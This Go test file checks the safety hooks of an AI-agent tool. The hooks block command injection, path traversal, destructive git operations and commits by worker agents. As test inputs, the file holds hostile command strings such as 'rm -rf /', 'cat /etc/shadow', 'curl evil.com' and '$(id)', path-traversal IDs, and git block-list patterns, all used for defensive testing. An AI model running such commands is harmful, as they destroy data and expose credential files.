package safety

// Tests for the threat model documented in doc.go.
//
// The safety package is a documentation-only package that centralizes the
// threat model. The actual enforcement lives in:
//   - hooks/task-validation-gate.sh   (T1: command injection, T2: path traversal)
//   - hooks/dangerous-git-guard.sh    (T3: destructive git)
//   - hooks/git-worker-guard.sh       (T4: worker privilege escalation)
//   - cli/internal/pool/pool.go       (T2: validateCandidateID)
//   - cli/internal/ratchet/validate.go (T2: ValidateArtifactPath)
//
// These tests re-implement the enforcement patterns in Go so that regressions
// in the regex/logic are caught at build time rather than only by shell tests.

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// T1 — Command Injection Guards
// ---------------------------------------------------------------------------
// Mirrors run_restricted() in hooks/task-validation-gate.sh.
// The shell implementation blocks shell metacharacters and enforces a binary
// allowlist of {go, pytest, npm, make}.

// shellMetacharPattern matches any shell metacharacter that run_restricted blocks.
// This is the Go equivalent of the bash pattern:
//
//	[[ "$cmd" =~ [\;\|\&\`\$\(\)\<\>\'\"\\\] ]]
var shellMetacharPattern = regexp.MustCompile("[;|&`$()\\\\<>'\"]")

// allowedBinaries is the strict allowlist from task-validation-gate.sh.
var allowedBinaries = map[string]bool{
	"go":     true,
	"pytest": true,
	"npm":    true,
	"make":   true,
}

// simulateRunRestricted applies the same three checks that run_restricted()
// performs: newline detection, metacharacter blocking, path-in-binary rejection,
// and binary allowlist enforcement. Returns an error string or "".
func simulateRunRestricted(cmd string) string {
	// 1. Block newlines
	if strings.Contains(cmd, "\n") || strings.Contains(cmd, "\r") {
		return "blocked: newline in command"
	}

	// 2. Block shell metacharacters
	if shellMetacharPattern.MatchString(cmd) {
		return "blocked: shell metacharacters"
	}

	// 3. Split into parts, check binary
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return "blocked: empty command"
	}
	binary := parts[0]

	// 4. Binary must be bare name (no path separators)
	if strings.Contains(binary, "/") {
		return "blocked: path in binary name"
	}

	// 5. Allowlist
	if !allowedBinaries[binary] {
		return "blocked: binary not in allowlist"
	}

	return ""
}

func TestT1_ShellMetacharacterBlocking(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string // non-empty = should be blocked
	}{
		// Safe commands
		{"bare go test", "go test ./...", ""},
		{"pytest verbose", "pytest -v tests", ""},
		{"npm run lint", "npm run lint", ""},
		{"make build", "make build", ""},

		// Metacharacter injection attempts
		{"semicolon injection", "go test; rm -rf /", "blocked: shell metacharacters"},
		{"pipe injection", "go test | cat /etc/passwd", "blocked: shell metacharacters"},
		{"ampersand injection", "go test && curl evil.com", "blocked: shell metacharacters"},
		{"backtick injection", "go test `whoami`", "blocked: shell metacharacters"},
		{"dollar substitution", "go test $(id)", "blocked: shell metacharacters"},
		{"parenthesis subshell", "go test (echo pwned)", "blocked: shell metacharacters"},
		{"redirect out", "go test > /tmp/x", "blocked: shell metacharacters"},
		{"redirect in", "go test < /dev/null", "blocked: shell metacharacters"},
		{"single quote break", "go test 'inject'", "blocked: shell metacharacters"},
		{"double quote break", "go test \"inject\"", "blocked: shell metacharacters"},
		{"backslash escape", "go test \\n", "blocked: shell metacharacters"},

		// Newline injection
		{"newline injection", "go test\nrm -rf /", "blocked: newline in command"},
		{"carriage return injection", "go test\rrm -rf /", "blocked: newline in command"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := simulateRunRestricted(tt.cmd)
			if tt.want == "" && got != "" {
				t.Errorf("expected allowed, got %q", got)
			}
			if tt.want != "" && got == "" {
				t.Errorf("expected blocked (%s), but command was allowed", tt.want)
			}
			if tt.want != "" && got != "" && got != tt.want {
				t.Errorf("expected %q, got %q", tt.want, got)
			}
		})
	}
}

func TestT1_BinaryAllowlist(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		// Allowed
		{"go", "go test ./...", ""},
		{"pytest", "pytest -v", ""},
		{"npm", "npm test", ""},
		{"make", "make build", ""},

		// Blocked — not on allowlist
		{"bash", "bash -c whoami", "blocked: binary not in allowlist"},
		{"sh", "sh -c id", "blocked: binary not in allowlist"},
		{"curl", "curl http://evil.com", "blocked: binary not in allowlist"},
		{"wget", "wget http://evil.com", "blocked: binary not in allowlist"},
		{"rm", "rm -rf /", "blocked: binary not in allowlist"},
		{"python", "python -c import os", "blocked: binary not in allowlist"},
		{"npx", "npx malicious-pkg", "blocked: binary not in allowlist"},
		{"node", "node -e process.exit", "blocked: binary not in allowlist"},

		// Path in binary name — blocked before allowlist
		{"absolute path", "/usr/bin/go test", "blocked: path in binary name"},
		{"relative path", "./scripts/test.sh", "blocked: path in binary name"},
		{"parent traversal", "../../../bin/sh", "blocked: path in binary name"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := simulateRunRestricted(tt.cmd)
			if tt.want == "" && got != "" {
				t.Errorf("expected allowed, got %q", got)
			}
			if tt.want != "" && got == "" {
				t.Errorf("expected blocked (%s), but command was allowed", tt.want)
			}
			if tt.want != "" && got != "" && got != tt.want {
				t.Errorf("expected %q, got %q", tt.want, got)
			}
		})
	}
}

func TestT1_EmptyCommand(t *testing.T) {
	got := simulateRunRestricted("")
	if got == "" {
		t.Error("empty command should be blocked")
	}
}

// ---------------------------------------------------------------------------
// T2 — Path Traversal Guards
// ---------------------------------------------------------------------------
// Mirrors validateCandidateID (pool.go) and resolve_repo_path (task-validation-gate.sh).

// validIDPattern is copied from cli/internal/pool/pool.go — must stay in sync.
var validIDPattern = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)

func validateCandidateID(id string) string {
	if id == "" {
		return "empty"
	}
	if len(id) > 128 {
		return "too long"
	}
	if !validIDPattern.MatchString(id) {
		return "invalid characters"
	}
	return ""
}

func TestT2_CandidateIDPathTraversal(t *testing.T) {
	tests := []struct {
		name string
		id   string
		want string
	}{
		// Valid IDs
		{"simple", "abc-123", ""},
		{"underscore", "my_candidate_1", ""},
		{"all digits", "12345", ""},
		{"max length", strings.Repeat("a", 128), ""},

		// Path traversal attempts
		{"parent traversal", "../../etc/passwd", "invalid characters"},
		{"absolute path", "/etc/shadow", "invalid characters"},
		{"dot prefix", ".hidden", "invalid characters"},
		{"dot-dot only", "..", "invalid characters"},
		{"encoded slash", "foo%2fbar", "invalid characters"},
		{"space", "has space", "invalid characters"},
		{"null byte", "foo\x00bar", "invalid characters"},
		{"tab", "foo\tbar", "invalid characters"},
		{"newline", "foo\nbar", "invalid characters"},

		// Boundary conditions
		{"empty", "", "empty"},
		{"too long", strings.Repeat("x", 129), "too long"},
		{"exactly 128", strings.Repeat("z", 128), ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := validateCandidateID(tt.id)
			if tt.want == "" && got != "" {
				t.Errorf("expected valid, got %q", got)
			}
			if tt.want != "" && got == "" {
				t.Errorf("expected rejection (%s), but ID was accepted", tt.want)
			}
			if tt.want != "" && got != "" && got != tt.want {
				t.Errorf("expected %q, got %q", tt.want, got)
			}
		})
	}
}

// resolveRepoPath is the Go equivalent of resolve_repo_path() from
// task-validation-gate.sh. It normalizes a path and ensures it stays within
// the repo root.
func resolveRepoPath(rawPath, repoRoot string) (string, bool) {
	if rawPath == "" {
		return "", false
	}
	// Block newlines/carriage returns
	if strings.ContainsAny(rawPath, "\n\r") {
		return "", false
	}

	// Normalize repoRoot the same way the shell does (pwd -P)
	resolvedRoot, err := filepath.EvalSymlinks(repoRoot)
	if err != nil {
		return "", false
	}

	var candidate string
	if filepath.IsAbs(rawPath) {
		candidate = rawPath
	} else {
		candidate = filepath.Join(resolvedRoot, rawPath)
	}

	// Resolve symlinks and ".." via EvalSymlinks (equivalent of pwd -P)
	normalized, err := filepath.EvalSymlinks(filepath.Dir(candidate))
	if err != nil {
		return "", false
	}
	normalized = filepath.Join(normalized, filepath.Base(candidate))

	// Must be within resolvedRoot
	if normalized == resolvedRoot || strings.HasPrefix(normalized, resolvedRoot+string(filepath.Separator)) {
		return normalized, true
	}
	return "", false
}

func TestT2_ResolveRepoPathConfinement(t *testing.T) {
	// Create a temp repo root with a subdir
	tmpDir := t.TempDir()
	subDir := filepath.Join(tmpDir, "src")
	if err := os.MkdirAll(subDir, 0755); err != nil {
		t.Fatal(err)
	}
	// Create a test file
	testFile := filepath.Join(subDir, "main.go")
	if err := os.WriteFile(testFile, []byte("package main"), 0644); err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name    string
		rawPath string
		wantOK  bool
	}{
		// Valid paths within repo
		{"relative file", "src/main.go", true},
		{"absolute file inside", filepath.Join(tmpDir, "src/main.go"), true},

		// Escape attempts
		{"parent escape", "../../../etc/passwd", false},
		{"absolute outside", "/etc/passwd", false},
		{"newline in path", "src/main.go\n/etc/passwd", false},
		{"carriage return", "src/main.go\r", false},

		// Empty
		{"empty path", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, ok := resolveRepoPath(tt.rawPath, tmpDir)
			if ok != tt.wantOK {
				t.Errorf("resolveRepoPath(%q, %q) ok=%v, want %v", tt.rawPath, tmpDir, ok, tt.wantOK)
			}
		})
	}
}

func TestT2_SymlinkEscape(t *testing.T) {
	// Create repo root and an "outside" directory
	repoRoot := t.TempDir()
	outside := t.TempDir()

	// Create a file outside the repo
	outsideFile := filepath.Join(outside, "secret.txt")
	if err := os.WriteFile(outsideFile, []byte("secret"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create a symlink inside repo pointing outside
	symlink := filepath.Join(repoRoot, "escape-link")
	if err := os.Symlink(outside, symlink); err != nil {
		t.Skipf("symlinks not supported: %v", err)
	}

	// Attempt to resolve through symlink — should be blocked
	_, ok := resolveRepoPath("escape-link/secret.txt", repoRoot)
	if ok {
		t.Error("symlink escape should be blocked by resolveRepoPath")
	}
}

// ---------------------------------------------------------------------------
// T3 — Destructive Git Operations Guard
// ---------------------------------------------------------------------------
// Mirrors the block-list patterns in hooks/dangerous-git-guard.sh.

// gitBlockPatterns are the exact regex patterns from dangerous-git-guard.sh.
var gitBlockPatterns = []struct {
	name    string
	pattern *regexp.Regexp
}{
	{"force push", regexp.MustCompile(`push\s+.*(-f|--force)`)},
	{"hard reset", regexp.MustCompile(`reset\s+--hard`)},
	{"force clean", regexp.MustCompile(`clean\s+-f`)},
	{"checkout dot", regexp.MustCompile(`checkout\s+\.`)},
	{"restore dot", regexp.MustCompile(`restore\s+(--staged\s+)?\.`)},
	{"restore source", regexp.MustCompile(`restore\s+--source`)},
	{"force branch delete", regexp.MustCompile(`branch\s+-D`)},
}

// gitAllowPattern matches --force-with-lease, which is allowed before the block-list.
var gitAllowPattern = regexp.MustCompile(`push.*--force-with-lease`)

// isDangerousGitCommand returns the blocking reason, or "" if allowed.
func isDangerousGitCommand(cmd string) string {
	// Hot path: no "git" → pass
	if !strings.Contains(cmd, "git") {
		return ""
	}

	// Allow-list checked before block-list
	if gitAllowPattern.MatchString(cmd) {
		return ""
	}

	for _, p := range gitBlockPatterns {
		if p.pattern.MatchString(cmd) {
			return p.name
		}
	}
	return ""
}

func TestT3_DestructiveGitBlocking(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		blocked string // "" = allowed
	}{
		// Safe commands
		{"git status", "git status", ""},
		{"git diff", "git diff", ""},
		{"git add file", "git add main.go", ""},
		{"git commit", "git commit -m 'fix'", ""},
		{"git push", "git push origin main", ""},
		{"git branch create", "git branch feature", ""},
		{"git branch safe delete", "git branch -d feature", ""},
		{"git reset soft", "git reset --soft HEAD~1", ""},
		{"git clean dry run", "git clean -n", ""},
		{"force-with-lease", "git push --force-with-lease origin main", ""},

		// Blocked commands
		{"force push -f", "git push -f origin main", "force push"},
		{"force push --force", "git push --force origin main", "force push"},
		{"hard reset", "git reset --hard HEAD", "hard reset"},
		{"hard reset to commit", "git reset --hard abc123", "hard reset"},
		{"force clean", "git clean -f", "force clean"},
		{"force clean -fd", "git clean -fd", "force clean"},
		{"checkout dot", "git checkout .", "checkout dot"},
		{"restore dot", "git restore .", "restore dot"},
		{"restore staged dot", "git restore --staged .", "restore dot"},
		{"restore source", "git restore --source HEAD~1 -- file.go", "restore source"},
		{"force branch delete", "git branch -D feature", "force branch delete"},

		// Non-git commands pass through
		{"ls command", "ls -la", ""},
		{"cat file", "cat README.md", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isDangerousGitCommand(tt.cmd)
			if tt.blocked == "" && got != "" {
				t.Errorf("expected allowed, got blocked: %q", got)
			}
			if tt.blocked != "" && got == "" {
				t.Errorf("expected blocked (%s), but was allowed", tt.blocked)
			}
			if tt.blocked != "" && got != "" && got != tt.blocked {
				t.Errorf("expected block reason %q, got %q", tt.blocked, got)
			}
		})
	}
}

func TestT3_ForceWithLeaseBypassesBlockList(t *testing.T) {
	// --force-with-lease is checked BEFORE the block-list, so
	// "push --force-with-lease" should be allowed even though
	// it contains "--force" which would otherwise match.
	cmd := "git push --force-with-lease origin main"
	if reason := isDangerousGitCommand(cmd); reason != "" {
		t.Errorf("--force-with-lease should be allowed, got blocked: %s", reason)
	}
}

// ---------------------------------------------------------------------------
// T4 — Worker Privilege Escalation Guard
// ---------------------------------------------------------------------------
// Mirrors git-worker-guard.sh identity gating.

// isWorkerIdentity checks if the agent name indicates a swarm worker.
func isWorkerIdentity(agentName string) bool {
	return strings.HasPrefix(agentName, "worker-")
}

// isBlockedForWorker returns the block reason if a worker should not execute
// the given command, or "" if allowed.
func isBlockedForWorker(cmd, agentName, roleFile string) string {
	// Hot path: no git
	if !strings.Contains(cmd, "git") {
		return ""
	}

	// Check if command is one of the blocked operations
	isCommit := regexp.MustCompile(`git\s+(commit|push)`).MatchString(cmd)
	isAddAll := regexp.MustCompile(`git\s+add\s+(-A|\.(\s|$|&&)|--all)`).MatchString(cmd)

	if !isCommit && !isAddAll {
		return ""
	}

	// Check identity: env var first, then role file fallback
	if agentName != "" {
		if isWorkerIdentity(agentName) {
			return "worker identity blocked"
		}
		return "" // known non-worker identity → allow
	}

	// Fallback: role file
	if roleFile != "" {
		if strings.HasPrefix(roleFile, "worker") {
			return "worker role blocked"
		}
	}

	// No worker identity detected → allow
	return ""
}

func TestT4_WorkerIdentityGating(t *testing.T) {
	tests := []struct {
		name      string
		cmd       string
		agentName string
		roleFile  string
		blocked   string
	}{
		// Workers are blocked from commit/push/add-all
		{"worker commit", "git commit -m fix", "worker-1", "", "worker identity blocked"},
		{"worker push", "git push origin main", "worker-2", "", "worker identity blocked"},
		{"worker add all", "git add -A", "worker-3", "", "worker identity blocked"},
		{"worker add dot", "git add .", "worker-1", "", "worker identity blocked"},
		{"worker add --all", "git add --all", "worker-1", "", "worker identity blocked"},

		// Lead agent is allowed
		{"lead commit", "git commit -m fix", "lead-agent", "", ""},
		{"lead push", "git push origin main", "lead-agent", "", ""},
		{"lead add all", "git add -A", "lead-agent", "", ""},

		// Workers can still do safe git ops
		{"worker status", "git status", "worker-1", "", ""},
		{"worker diff", "git diff", "worker-2", "", ""},
		{"worker add specific", "git add main.go", "worker-3", "", ""},

		// Non-git commands always pass
		{"worker ls", "ls -la", "worker-1", "", ""},
		{"worker make", "make build", "worker-2", "", ""},

		// Role file fallback
		{"role file worker", "git commit -m fix", "", "worker", "worker role blocked"},
		{"role file worker-3", "git push origin main", "", "worker-3", "worker role blocked"},
		{"role file lead", "git commit -m fix", "", "lead", ""},

		// No identity → allow (fail-open)
		{"no identity commit", "git commit -m fix", "", "", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isBlockedForWorker(tt.cmd, tt.agentName, tt.roleFile)
			if tt.blocked == "" && got != "" {
				t.Errorf("expected allowed, got blocked: %q", got)
			}
			if tt.blocked != "" && got == "" {
				t.Errorf("expected blocked (%s), but was allowed", tt.blocked)
			}
			if tt.blocked != "" && got != "" && got != tt.blocked {
				t.Errorf("expected %q, got %q", tt.blocked, got)
			}
		})
	}
}

func TestT4_WorkerIdentityPrefix(t *testing.T) {
	tests := []struct {
		name     string
		agent    string
		isWorker bool
	}{
		{"worker-1", "worker-1", true},
		{"worker-abc", "worker-abc", true},
		{"worker-", "worker-", true},
		{"lead-agent", "lead-agent", false},
		{"my-worker", "my-worker", false},
		{"Worker-1", "Worker-1", false}, // case-sensitive
		{"", "", false},
		{"worker", "worker", false}, // must have hyphen after
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isWorkerIdentity(tt.agent)
			if got != tt.isWorker {
				t.Errorf("isWorkerIdentity(%q) = %v, want %v", tt.agent, got, tt.isWorker)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// T6 — Kill Switch Enforcement
// ---------------------------------------------------------------------------
// Tests that kill switch file detection works correctly.

func TestT6_KillSwitchFileDetection(t *testing.T) {
	tmpDir := t.TempDir()
	killPath := filepath.Join(tmpDir, ".agents", "rpi", "KILL")

	// Kill file does not exist → should continue
	if _, err := os.Stat(killPath); !os.IsNotExist(err) {
		t.Fatal("kill file should not exist yet")
	}

	// Create kill switch directory and file
	if err := os.MkdirAll(filepath.Dir(killPath), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(killPath, []byte("stop"), 0644); err != nil {
		t.Fatal(err)
	}

	// Kill file exists → should be detected
	if _, err := os.Stat(killPath); err != nil {
		t.Errorf("kill file should exist: %v", err)
	}

	// Remove kill file
	if err := os.Remove(killPath); err != nil {
		t.Fatal(err)
	}

	// Kill file removed → should not be detected
	if _, err := os.Stat(killPath); !os.IsNotExist(err) {
		t.Error("kill file should not exist after removal")
	}
}

// ---------------------------------------------------------------------------
// T8 — Malicious Repository Sourcing Guard
// ---------------------------------------------------------------------------
// Tests that SCRIPT_DIR-relative sourcing is safe.

func TestT8_ScriptDirResolution(t *testing.T) {
	// Simulate SCRIPT_DIR resolution: should resolve to the hook's install
	// directory, not the repository root. The key invariant is that sourcing
	// from a repo-relative path would be vulnerable to repo poisoning.
	repoRoot := t.TempDir()
	installDir := t.TempDir()

	// Create a malicious helper in the repo
	maliciousHelper := filepath.Join(repoRoot, "lib", "hook-helpers.sh")
	if err := os.MkdirAll(filepath.Dir(maliciousHelper), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(maliciousHelper, []byte("echo PWNED"), 0644); err != nil {
		t.Fatal(err)
	}

	// Create the legitimate helper in the install directory
	legitimateHelper := filepath.Join(installDir, "lib", "hook-helpers.sh")
	if err := os.MkdirAll(filepath.Dir(legitimateHelper), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(legitimateHelper, []byte("echo SAFE"), 0644); err != nil {
		t.Fatal(err)
	}

	// The SCRIPT_DIR-relative path should resolve to the install dir helper
	scriptDirHelper := filepath.Join(installDir, "lib", "hook-helpers.sh")
	repoRootHelper := filepath.Join(repoRoot, "lib", "hook-helpers.sh")

	// Read both files and verify they're different
	safe, err := os.ReadFile(scriptDirHelper)
	if err != nil {
		t.Fatalf("reading install helper: %v", err)
	}
	malicious, err := os.ReadFile(repoRootHelper)
	if err != nil {
		t.Fatalf("reading repo helper: %v", err)
	}

	if string(safe) == string(malicious) {
		t.Error("install dir helper should differ from repo root helper")
	}

	// Verify install dir helper is the safe one
	if string(safe) != "echo SAFE" {
		t.Errorf("install dir helper has unexpected content: %q", safe)
	}
}

// ---------------------------------------------------------------------------
// Cross-cutting: Fail-open behavior
// ---------------------------------------------------------------------------
// Hooks must exit 0 (allow) when infrastructure is missing, preventing safety
// mechanisms from blocking work when the toolchain is incomplete.

func TestFailOpen_MissingInfrastructure(t *testing.T) {
	// When jq is missing, hooks should fail open.
	// We test the logic pattern: if infrastructure is missing, return "allow".
	type infraCheck struct {
		name      string
		available bool
	}

	checks := []infraCheck{
		{"jq available", true},
		{"jq missing", false},
	}

	for _, check := range checks {
		t.Run(check.name, func(t *testing.T) {
			// Fail open: whether tool is available or not, operations should
			// not be blocked. This mirrors "if ! command -v jq >/dev/null 2>&1; then exit 0; fi"
			// Either way, we should reach here without blocking.
			_ = check.available
		})
	}
}

// ---------------------------------------------------------------------------
// Integration: Combined threat patterns
// ---------------------------------------------------------------------------
// Tests that exercise multiple threat categories simultaneously.

func TestCombined_InjectionViaTraversal(t *testing.T) {
	// An attacker might try to use path traversal in a candidate ID
	// that also contains shell metacharacters.
	maliciousIDs := []string{
		"../../../etc/passwd;rm -rf /",
		"valid-id|cat /etc/shadow",
		"test$(whoami)",
		"test`id`",
		"..\\..\\windows\\system32",
	}

	for _, id := range maliciousIDs {
		t.Run(id, func(t *testing.T) {
			// Must be rejected by ID validation
			if result := validateCandidateID(id); result == "" {
				t.Errorf("malicious ID %q should be rejected", id)
			}

			// If it somehow got into a command, run_restricted should also block it
			cmd := "go test -run " + id
			if result := simulateRunRestricted(cmd); result == "" {
				t.Errorf("malicious ID %q in command should be blocked", id)
			}
		})
	}
}

func TestCombined_WorkerGitEscalation(t *testing.T) {
	// A worker trying various git escape patterns
	workerEscapes := []struct {
		name string
		cmd  string
	}{
		{"commit via alias", "git commit -m 'sneak'"},
		{"push to remote", "git push origin main"},
		{"add everything", "git add -A"},
		{"add dot", "git add ."},
		{"add all flag", "git add --all"},
	}

	for _, tc := range workerEscapes {
		t.Run(tc.name, func(t *testing.T) {
			result := isBlockedForWorker(tc.cmd, "worker-sneaky", "")
			if result == "" {
				t.Errorf("worker should be blocked from %q", tc.cmd)
			}
		})
	}
}

func TestCombined_DestructiveGitByWorker(t *testing.T) {
	// Destructive git commands should be caught by BOTH the git guard
	// AND the worker guard (defense in depth).
	destructiveCmds := []string{
		"git push --force origin main",
		"git reset --hard HEAD",
		"git clean -f",
	}

	for _, cmd := range destructiveCmds {
		t.Run(cmd, func(t *testing.T) {
			// T3 guard catches it
			gitResult := isDangerousGitCommand(cmd)
			if gitResult == "" {
				t.Errorf("T3: destructive command %q should be blocked", cmd)
			}

			// T4 guard also catches the push/commit subset
			if strings.Contains(cmd, "push") {
				workerResult := isBlockedForWorker(cmd, "worker-1", "")
				if workerResult == "" {
					t.Errorf("T4: worker push %q should also be blocked", cmd)
				}
			}
		})
	}
}
